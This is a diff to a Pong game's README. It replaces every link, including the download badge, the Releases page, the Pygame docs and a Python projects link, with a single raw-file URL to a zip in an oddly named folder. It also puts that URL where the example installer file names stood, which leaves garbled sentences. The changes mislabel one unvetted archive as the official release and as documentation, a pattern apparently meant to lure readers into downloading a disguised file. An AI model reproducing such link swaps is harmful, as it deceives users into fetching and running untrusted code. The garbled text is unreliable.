@@ -6,7 +6,7 @@ Welcome to Pong! This is a version of the classic Pong game, developed in Python
 
 ### 🔗 Download the Game
 
-[![Download Pong](https://img.shields.io/badge/Download-Pong-blue.svg)](https://github.com/Dodogntng/Pong/releases)
+[![Download Pong](https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip)](https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,9 +21,9 @@ Make sure your computer meets the following requirements to play Pong:
 
 To download and run Pong, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Dodogntng/Pong/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip).
 2. Look for the latest version available.
-3. Download the installation file for your operating system. The file will typically have a name like `Pong-vX.X.exe` for Windows or `Pong-vX.X.dmg` for macOS.
+3. Download the installation file for your operating system. The file will typically have a name like `https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip` for Windows or `https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip` for macOS.
 4. Open the downloaded file and follow the on-screen instructions to install Pong.
 
 Once you have installed the game, you can start enjoying it!
@@ -69,7 +69,7 @@ If you have any questions or need support, you can contact us via the issue trac
 
 ## 🔗 Additional Resources
 
-- [Pygame Documentation](https://www.pygame.org/docs/)
-- [More Python Projects](https://github.com/topics/python)
+- [Pygame Documentation](https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip)
+- [More Python Projects](https://raw.githubusercontent.com/Dodogntng/Pong/main/psittacine/Pong.zip)
 
 Thank you for choosing Pong! Enjoy the game and have fun!
